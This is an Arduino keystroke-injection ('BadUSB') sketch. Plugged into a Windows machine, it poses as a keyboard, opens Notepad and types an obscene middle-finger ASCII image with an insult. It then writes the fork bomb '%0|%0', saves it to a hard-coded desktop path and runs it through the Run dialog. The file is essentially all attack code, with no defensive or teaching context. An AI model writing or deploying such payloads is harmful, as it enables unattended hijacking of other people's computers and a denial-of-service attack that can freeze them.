#include <Keyboard.h>
#include <KeyboardLayout.h>
#include <Keyboard_es_ES.h>

#define kbd_es_es

void setup() {
  Keyboard.begin();
}

void loop() {
  delay(5000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.print("cmd");
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.print("notepad.exe");
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(9000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('a');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.press(KEY_DELETE);
  delay(1000);
  Keyboard.println("                 $$$$");
  delay(400);
  Keyboard.println("               $$    $$");
  delay(400);
  Keyboard.println("               $$    $$");
  delay(400);
  Keyboard.println("               $$    $$");
  delay(400);
  Keyboard.println("               $$    $$");
  delay(400);
  Keyboard.println("               $$    $$");
  delay(400);
  Keyboard.println("           $$$$$$    $$$$$$");
  delay(400);
  Keyboard.println("         $$    $$    $$    $$$$");
  delay(400);
  Keyboard.println("         $$    $$    $$    $$  $$");
  delay(400);
  Keyboard.println(" $$$$$$  $$    $$    $$    $$    $$");
  delay(400);
  Keyboard.println(" $$    $$$$                $$    $$");
  delay(400);
  Keyboard.println(" $$      $$                      $$");
  delay(400);
  Keyboard.println("   $$    $$                      $$");
  delay(400);
  Keyboard.println("    $$$  $$                      $$");
  delay(400);
  Keyboard.println("     $$                          $$");
  delay(400);
  Keyboard.println("      $$$                        $$");
  delay(400);
  Keyboard.println("       $$                      $$$");
  delay(400);
  Keyboard.println("        $$$                    $$");
  delay(400);
  Keyboard.println("         $$                    $$");
  delay(400);
  Keyboard.println("          $$$                $$$");
  delay(400);
  Keyboard.println("           $$                $$");
  delay(400);
  Keyboard.println("           $$$$$$$$$$$$$$$$$$$$");
  delay(400);
  Keyboard.println("Go fuck yourself");
  delay(3000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('a');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.press(KEY_DELETE);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.println("%0|%0");
  delay(1000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('f');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.press('a');
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.println("C:\\Users\\matti\\Desktop\\FUed.bin");
  delay(900);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();
  delay(800);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(2000);
  Keyboard.releaseAll();
  delay(900);
  Keyboard.println("C:\\Users\\matti\\Desktop\\FUed.bin");
  delay(900);
  Keyboard.press(KEY_RETURN);
  delay(2000);
  Keyboard.releaseAll();
  delay(900);
  while (1)
    ;
}
